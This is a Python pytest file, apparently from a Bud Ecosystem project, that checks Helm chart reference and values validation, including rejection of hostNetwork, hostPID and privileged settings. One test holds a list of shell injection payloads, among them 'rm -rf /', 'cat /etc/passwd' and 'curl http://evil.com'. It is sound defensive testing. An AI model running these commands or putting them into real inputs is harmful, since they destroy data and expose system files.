#  -----------------------------------------------------------------------------
#  Copyright (c) 2024 Bud Ecosystem Inc.
#  #
#  Licensed under the Apache License, Version 2.0 (the "License");
#  you may not use this file except in compliance with the License.
#  You may obtain a copy of the License at
#  #
#      http://www.apache.org/licenses/LICENSE-2.0
#  #
#  Unless required by applicable law or agreed to in writing, software
#  distributed under the License is distributed on an "AS IS" BASIS,
#  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#  See the License for the specific language governing permissions and
#  limitations under the License.
#  -----------------------------------------------------------------------------

"""Integration tests for Helm chart security validation.

This module tests the end-to-end security boundary across two layers:
  1. The BudCluster ``validate_helm_config`` validator (runtime config checks).
  2. The BudUseCases ``HelmChartConfig`` Pydantic schema (input validation).

Both layers must agree on what constitutes a safe chart reference and a safe
set of Helm values.  Any regression that widens the allowed surface in either
layer should cause a test failure here.
"""

from __future__ import annotations

import sys
from pathlib import Path

import pytest
from pydantic import ValidationError

# ---------------------------------------------------------------------------
# Path manipulation so we can import from sibling services without installing
# them as packages.  The two service roots are added once.
# ---------------------------------------------------------------------------
_SERVICES_ROOT = Path(__file__).resolve().parents[2]  # …/services

_budcluster_root = str(_SERVICES_ROOT / "budcluster")
_budusecases_root = str(_SERVICES_ROOT / "budusecases")

if _budcluster_root not in sys.path:
    sys.path.insert(0, _budcluster_root)
if _budusecases_root not in sys.path:
    sys.path.insert(0, _budusecases_root)

from budcluster.jobs.validators import validate_helm_config  # noqa: E402

from budusecases.templates.schemas import HelmChartConfig  # noqa: E402

# ============================================================================
# Helpers
# ============================================================================


def _make_config(chart_ref: str, values: dict | None = None) -> dict:
    """Build a minimal Helm job config dict for ``validate_helm_config``."""
    cfg: dict = {"chart_ref": chart_ref}
    if values is not None:
        cfg["values"] = values
    return cfg


# ============================================================================
# Layer 1 — validate_helm_config (BudCluster runtime validator)
# ============================================================================


class TestValidateHelmConfigChartRef:
    """Chart reference acceptance / rejection via the runtime validator."""

    def test_oci_chart_ref_accepted(self) -> None:
        """OCI registry references must be allowed."""
        errors = validate_helm_config(_make_config("oci://registry.bud.ai/charts/agent"))
        assert errors == [], f"Expected no errors, got: {errors}"

    def test_https_chart_ref_accepted(self) -> None:
        """HTTPS chart URLs must be allowed."""
        errors = validate_helm_config(_make_config("https://charts.example.com/agent-1.0.tgz"))
        assert errors == [], f"Expected no errors, got: {errors}"

    def test_local_chart_ref_accepted(self) -> None:
        """Local bundled chart paths (charts/<name>) must be allowed."""
        errors = validate_helm_config(_make_config("charts/my-local-chart"))
        assert errors == [], f"Expected no errors, got: {errors}"

    def test_arbitrary_chart_ref_rejected(self) -> None:
        """A bare chart name without a recognised prefix must be rejected."""
        errors = validate_helm_config(_make_config("my-chart"))
        assert len(errors) == 1
        assert "does not match any allowed pattern" in errors[0]

    def test_shell_injection_in_chart_ref_rejected(self) -> None:
        """Chart refs containing shell meta-characters must be rejected.

        Even if the ref starts with a valid scheme, embedded semicolons,
        backticks, pipes, or ``$()`` expansions should not pass the
        allowlist regex.
        """
        injection_payloads = [
            "oci://valid; rm -rf /",
            "oci://reg.io/chart$(whoami)",
            "https://evil.com/chart | cat /etc/passwd",
            "charts/good`id`",
            "oci://reg.io/chart && curl http://evil.com",
        ]
        for payload in injection_payloads:
            errors = validate_helm_config(_make_config(payload))
            assert errors, f"Shell injection payload should be rejected: {payload!r}"


class TestValidateHelmConfigValues:
    """Helm values security checks via the runtime validator."""

    def test_values_with_host_network_rejected(self) -> None:
        """Values containing ``hostNetwork`` at any level must be rejected."""
        errors = validate_helm_config(_make_config("oci://registry.bud.ai/charts/agent", values={"hostNetwork": True}))
        assert any("hostNetwork" in e for e in errors), f"Expected hostNetwork error, got: {errors}"

    def test_values_with_privileged_rejected(self) -> None:
        """Nested ``securityContext.privileged`` must be rejected."""
        errors = validate_helm_config(
            _make_config(
                "oci://registry.bud.ai/charts/agent",
                values={"securityContext": {"privileged": True}},
            )
        )
        assert any("privileged" in e for e in errors), f"Expected privileged error, got: {errors}"

    def test_values_with_host_pid_rejected(self) -> None:
        """Values containing ``hostPID`` must be rejected."""
        errors = validate_helm_config(_make_config("oci://registry.bud.ai/charts/agent", values={"hostPID": True}))
        assert any("hostPID" in e for e in errors), f"Expected hostPID error, got: {errors}"

    def test_clean_values_accepted(self) -> None:
        """Normal, non-privileged values must pass without errors."""
        errors = validate_helm_config(
            _make_config(
                "oci://registry.bud.ai/charts/agent",
                values={"replicas": 2, "port": 8080, "image": {"tag": "v1.2.3"}},
            )
        )
        assert errors == [], f"Expected no errors for clean values, got: {errors}"


# ============================================================================
# Layer 2 — HelmChartConfig Pydantic schema (BudUseCases input validation)
# ============================================================================


class TestHelmChartConfigSchema:
    """Pydantic-level validation for ``HelmChartConfig.ref``."""

    def test_schema_validates_chart_ref_format(self) -> None:
        """An invalid chart ref must raise ``ValidationError``."""
        with pytest.raises(ValidationError) as exc_info:
            HelmChartConfig(ref="my-chart")
        error_text = str(exc_info.value)
        assert "Invalid chart reference" in error_text

    def test_schema_accepts_valid_chart_ref(self) -> None:
        """A valid OCI chart ref must be accepted by the schema."""
        config = HelmChartConfig(ref="oci://registry.bud.ai/charts/agent")
        assert config.ref == "oci://registry.bud.ai/charts/agent"
        assert config.values == {}
        assert config.version is None
